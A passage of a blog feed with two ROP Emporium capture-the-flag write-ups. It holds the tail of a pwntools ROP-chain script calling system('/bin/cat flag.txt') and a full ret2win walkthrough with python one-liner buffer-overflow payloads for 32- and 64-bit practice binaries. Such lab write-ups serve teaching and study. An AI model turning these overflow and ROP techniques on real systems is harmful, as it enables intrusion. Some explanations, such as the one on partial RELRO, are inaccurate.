+<span class="n">info</span><span class="p">(</span><span class="s">"%r pattern (offset: %r)"</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
+
+<span class="c1">##### CRAFTING PAYLOAD #####
+</span>
+<span class="c1"># Craft a new payload which puts system('/bin/cat flag.txt') at correct offset
+# Note that we have to call pop_rdi gadget here
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bincat_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1">#Get our flag!
+</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="c1">##### END #####
+</span></code></pre></div></div>]]></content><author><name></name></author><category term="ROP"/><category term="GDB"/><category term="pwndbg"/><category term="pwntools"/><category term="formatting"/><category term="links"/><category term="binexp"/><summary type="html"><![CDATA[ROP Emporium challenge 2 - split]]></summary></entry><entry><title type="html">ROP Emporium - ret2win</title><link href="https://parroquet.github.io/blog/2022/ret2win/" rel="alternate" type="text/html" title="ROP Emporium - ret2win"/><published>2022-12-27T22:20:00+00:00</published><updated>2022-12-27T22:20:00+00:00</updated><id>https://parroquet.github.io/blog/2022/ret2win</id><content type="html" xml:base="https://parroquet.github.io/blog/2022/ret2win/"><![CDATA[<h2 id="basic-setup">Basic setup:</h2> <ul> <li>ROPEmporium x86 &amp; x86_64 binaries</li> <li>Ubuntu lab machine</li> <li>GDB &amp; pwndbg</li> <li>pwntools</li> </ul> <p> </p> <h3 id="link-to-challenge">Link to challenge</h3> <p><a href="https://ropemporium.com/challenge/ret2win.html">https://ropemporium.com/challenge/ret2win.html</a></p> <p> </p> <h3 id="the-32-bit-solve">The 32 bit solve</h3> <p>The first step for this binary is to run the <strong>file</strong> command to see what type of binary it is. We see that it is a 32 bit ELF binary. We then run the <strong>checksec</strong> command to see what protections are in place.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/1checksec.png" alt="checksec" width="750"/></p> <p>As we can see in the above image, DEP/NX is enabled meaing that we cannot execute shellcode on the stack. We also see that partial RELRO is enabled which means that the the Global Offset Table (GOT) is read only. This means that we cannot overwrite any GOT entries.</p> <p>These protections should not be an issue as we only need to overwrite the return address to point to the ret2win function for the flag.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/3userdefinedfunctions.png" alt="definedfunctions" width="750"/></p> <p>Using the nm command we can see user defined functions <strong>pwnme</strong> and <strong>ret2win</strong> along with their addresses which may be of interest to us.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/4strngs.png" alt="strngs" width="750"/></p> <p>We can also run a basic <strong>strings</strong> command to find any interesting information. We can see the strings for when we run the program as well as the output message for the flag. It is seen to execute /bin/cat flag.txt aswell which is useful to know.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/5gdbdisas.png" alt="gdbdisas" width="750"/></p> <p>Opening the program in gdb we can check the disassembly of each function. Looking at the ret2win function which is not called, we can see that system@plt is called with the argument /bin/cat flag.txt which is used to execute the command and output the flag. We need to call this function by overwriting a return address so that it redirects and executes the start of the ret2win function instead.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/6pwnme.png" alt="6pwnme" width="750"/></p> <p>Disassembling the function shows us that <strong>push 0x20</strong> is executed to create a buffer of 32 bytes on the stack which is used to store the user input. If we overwrite this buffer with 32 bytes of rubbish and then overwrite the return address with the address of the ret2win function, we should be able to execute the ret2win function and get the flag.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/8addressesoffuncs.png" alt="8addressesoffuncs" width="750"/></p> <p>Running the <strong>p &lt;function name&gt;</strong> command within gdb we can get the address of the ret2win function which we need to overwrite the return address with.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/9cylic.png" alt="9cylic" width="750"/></p> <p>We can use the <strong>cyclic</strong> command to generate a string of 100 characters which we can use to overwrite the buffer. We can then enter this into the input field to crash the program.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/10findingcrashpoint.png" alt="10findingcrashpoint" width="750"/></p> <p>Once the program crashes, we can look at the EIP register to see where the crash occured. We can see that the crash occured at 0x6161616c (laaa) which tells us the offset by looking back through the input string. The command <strong>cyclic -l laaa</strong> can be used to find the offset.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/11cyclicoffset.png" alt="11cyclicoffset" width="750"/></p> <p>The offset is shown to be 44 bytes so we can overwrite the return address by adding the ret2win function address after this.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/15craftingpayloadwithreturnaddr.png" alt="15craftingpayloadwithreturnaddr" width="750"/></p> <p>Using python3 we print 44 ‘A’ characters and then the address of the ret2win function in little endian format. We can then pipe this into the program and get the flag.</p> <p><code class="language-plaintext highlighter-rouge">python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 + b'\x2c\86\x04\x08')" | ./ret2win32</code></p> <p> </p> <p><img src="../../../assets/img/ret2win_img/16craftedpayloadpython2.png" alt="16craftedpayloadpython2" width="750"/></p> <p>Python2 can also be used to do this easier as python3 requires importing sys to output bytes and strings together. Here we print 44 NOP characters as a placeholder and add the return address in little endian format for the flag.</p> <p><code class="language-plaintext highlighter-rouge">python2 -c 'print "\x90"*44 + "\x2c\86\x04\x08"' | ./ret2win32</code></p> <p> </p> <h3 id="the-64-bit-solve">The 64 bit solve</h3> <p>The 64 bit binary is similar but we need to do a bit extra when looking at the offset.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/1764bitcyclic.png" alt="1764bitcyclic" width="750"/></p> <p>After following the same steps, once we get to the cyclic generation, we can see a slightly different pattern generated due to 64 bit programs having a larger address space.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/18findingoffset.png" alt="18findingoffset" width="750"/></p> <p>We can see that RIP has not got an string we can search for. This is because in a 64 bit architecture, an address is not returned to unless it resides within a range. Instead we can see the value of the RSP register which is the stack pointer. We can use this to find the offset. We can also use the last 4 bytes of the RBP and add 4 but I will tend to use the RSP method in future guides.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/19offsetfound.png" alt="19offsetfound" width="750"/></p> <p>The offset is found to be 40 bytes. We can then craft the payload in the same way as before.</p> <p> </p> <p><img src="../../../assets/img/ret2win_img/20payloadbuiltandfinished.png" alt="20payloadbuiltandfinished" width="750"/></p> <p>Using python2, we can again print 40 NOP characters followed by the little endian address of the ret2win function. \x00\x00\x00\x00 is then appended to the end to fit the length of 64 bit addresses. This returns us the flag.</p> <p><code class="language-plaintext highlighter-rouge">python2 -c 'print "\x90"*40 + "\x56\x07\x40\x00\x00\x00\x00\x00"' | ./ret2win</code></p>]]></content><author><name></name></author><category term="ROP"/><category term="GDB"/><category term="pwndbg"/><category term="pwntools"/><category term="formatting"/><category term="links"/><category term="binexp"/><summary type="html"><![CDATA[ROP Emporium challenge 1 - ret2win]]></summary></entry></feed>
